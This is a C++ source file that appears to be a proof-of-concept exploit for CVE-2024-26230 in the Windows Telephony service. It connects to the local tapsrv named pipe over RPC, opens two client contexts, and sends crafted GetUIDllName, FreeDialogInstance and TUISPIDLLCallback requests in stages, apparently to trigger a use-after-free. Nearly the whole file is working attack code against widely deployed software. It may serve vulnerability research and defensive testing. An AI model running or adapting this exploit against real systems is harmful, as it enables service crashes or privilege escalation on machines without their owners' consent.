// CVE-2024-26230.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#define _CRT_SECURE_NO_WARNINGS

#include "Header.h"
#pragma comment(lib, "Rpcrt4.lib")

void ClientDetach_Stub(PCONTEXT_HANDLE_TYPE context) {

    ClientDetach(&context);
}
std::vector<uint8_t> ClientRequest_Stub(PCONTEXT_HANDLE_TYPE context, std::vector<uint8_t> requestBytes) {
    LONG byteWritten = requestBytes.size();
    ClientRequest(context, (unsigned char*)(requestBytes.data()), requestBytes.size(), &byteWritten);
    // Print the first 8 bytes
    return requestBytes;
}
void ClientAttach_Stub(PCONTEXT_HANDLE_TYPE * pCONTEXT) {
    std::wstring pszDomainUser{ L"" };
    TCHAR  infoBuf[1024] = { '\0' };
    DWORD nSize = 1024;
    std::wstring hostName{ 0 };
    GetComputerNameW(infoBuf, &nSize);
    std::wstring currentMachine = infoBuf;
    LONG output = 0;
    LONG phAsyncEventsEvent = 0;
    RPC_STATUS rpcStatus;
    RPC_WSTR szStringBinding = NULL;
    RPC_WSTR pszProtSeq = (RPC_WSTR)L"ncacn_np";
    RPC_WSTR pszTCPPort = (RPC_WSTR)L"\\pipe\\tapsrv";
    RPC_WSTR pszTCPHost = (RPC_WSTR)currentMachine.c_str();
    rpcStatus = RpcStringBindingCompose(
        NULL,           // UUID to bind to.
        pszProtSeq,		// Use TCP/IP protocol.
        pszTCPHost,		// TCP/IP network address to use.
        pszTCPPort,     // TCP/IP port to use.
        NULL,           // Protocol dependent network options to use.
        &szStringBinding);	// String binding output.
    std::wcout << "The szStringBinding: " << (wchar_t*)szStringBinding << std::endl;
    // Create a valid binding handle from String
    //std::wstring pszMachine { L"192.168.238.1\"ncacn_np\"8081\"ncacn_np\"\\\\pipe\\whatever\"" };
    //RPC over HTTP
    std::wstring pszMachine{ L"10.4.99.1\"ncacn_ip_tcp\"8081\"ncacn_http\"8080\"" };

    rpcStatus = RpcBindingFromStringBinding(
        szStringBinding,	// The string binding to validate.
        &tapsrvImplicitHandle	// Put the result in the  binding
    );						// handle defined in the IDL file.

    if (rpcStatus != RPC_S_OK) {
        wprintf(L"[-] RpcBindingFromStringBinding() failed with status: %d.\n", rpcStatus);
        exit(rpcStatus);
    }
    std::wcout << "pszMachine : " << pszMachine.c_str() << std::endl;
    RpcBindingSetAuthInfo(tapsrvImplicitHandle, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_DEFAULT, NULL, RPC_C_AUTHN_DEFAULT);

    NTSTATUS status;

    status = ClientAttach(pCONTEXT, GetCurrentProcessId(), &phAsyncEventsEvent, const_cast<wchar_t*>(pszDomainUser.c_str()), const_cast<wchar_t*>(pszMachine.c_str()));
    std::cout << "RPC status : " << status << std::endl;
    std::cout << "TapiSrvContext  : " << pCONTEXT << std::endl;
}
std::vector<uint8_t> GetUIDLLName(uint32_t index, uint32_t index2 , uint32_t index3, uint32_t index4) {
    std::vector<uint8_t> requestBytes(sizeof(TAPI_GetUIDllName), '\0');
    auto request{ reinterpret_cast<PTAPI_GetUIDllName>(requestBytes.data()) };
    request->index0 = index;
    request->int_index1 = index2;
    //maybe 1 needed to pass the while-loop
    request->int_index2 = 1;
    request->switchacse_index3 = index4;
    request->int_index4= 0;
    request->int_index5 = 0;
    //has to equal to 0xFFFFFFFF
    request->int_index6 = -1;
    //has to be 0
    request->int_index7 = 0;
    request->int_index8 = 0;
    return requestBytes;
}

std::vector<uint8_t> FreeDiagInstance(uint32_t index, uint32_t index2, uint32_t index3, uint32_t index4) {
    std::vector<uint8_t> requestBytes(sizeof(TAPI_GetUIDllName), '\0');
    auto request{ reinterpret_cast<PTAPI_GetUIDllName>(requestBytes.data()) };
    request->index0 = index;
    request->int_index1 = index2;
    //maybe 1 needed to pass the while-loop
    //This will be used as the second argument of the ReferenceObject();
    request->int_index2 = 2;
    request->switchacse_index3 = index4;
    request->int_index4 = 0;
    request->int_index5 = 0;
    //has to equal to 0xFFFFFFFF
    request->int_index6 = -1;
    //has to be 0
    request->int_index7 = 0;
    request->int_index8 = 0;
    return requestBytes;
}

std::vector<uint8_t> TUISPIDLLCallback_CVE(uint32_t index, uint32_t index2, uint32_t index3, uint32_t index4) {
    std::vector<uint8_t> requestBytes(sizeof(TAPI_GetUIDllName), '\0');
    auto request{ reinterpret_cast<PTAPI_GetUIDllName>(requestBytes.data()) };
    request->index0 = index;
    request->int_index1 = index2;
    //maybe 1 needed to pass the while-loop
    request->int_index2 = 2;
    request->switchacse_index3 = index4;
    request->int_index4 = 0;
    request->int_index5 = 0;
    //has to equal to 0xFFFFFFFF
    request->int_index6 = -1;
    //has to be 0
    request->int_index7 = 0;
    request->int_index8 = 0;
    return requestBytes;

}


PCONTEXT_HANDLE_TYPE Stage1() {
    PCONTEXT_HANDLE_TYPE context;
    ClientAttach_Stub(&context);
    std::vector<uint8_t> requestBytes = ClientRequest_Stub(context, GetUIDLLName(GaFuncs::GetUIDllName, 1, 1, 3));
    auto returnBuffer{ reinterpret_cast<PTAPI_GetUIDllName>(requestBytes.data())};
    std::printf("Context Index for Context is : 0x%08x", returnBuffer->int_index8);
    return context;
}
//stage 2
void Stage2(PCONTEXT_HANDLE_TYPE context) {
    ClientRequest_Stub(context, FreeDiagInstance(GaFuncs::FreeDialogInstance, 1, 1, 3));
    std::cout << "FreeDiagInstance" << std::endl;
}
//stage 3 
void Stage3_trigger(PCONTEXT_HANDLE_TYPE context) {
    ClientRequest_Stub(context, TUISPIDLLCallback_CVE(GaFuncs::TUISPIDLLCallback, 1, 1, 3));
    std::cout << "TUISPIDLLCallback_CVE" << std::endl;
}


int main()
{
    std::wstring tapisrv{ L"TapiSrv" };

    ServiceHelper tapiservice { tapisrv , SERVICE_START};
    //tapiservice.StartTheDamnService();
    std::vector<PCONTEXT_HANDLE_TYPE> contextArray(2);
    for (int i = 0; i < contextArray.size(); i++) {
        contextArray[i] = Stage1();
        std::cout << "PCONTEXT_HANDLE: " << i << " value : " << contextArray[i] << std::endl;
    }

    Stage2(contextArray[1]);
    Stage3_trigger(contextArray[0]);

    //free the first Object by invoking FreeDiagInstance


    return 0;
}


void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
    return((void __RPC_FAR*) malloc(cBytes));
}
void __RPC_USER midl_user_free(void __RPC_FAR* ptr)
{
 
    free(ptr);
}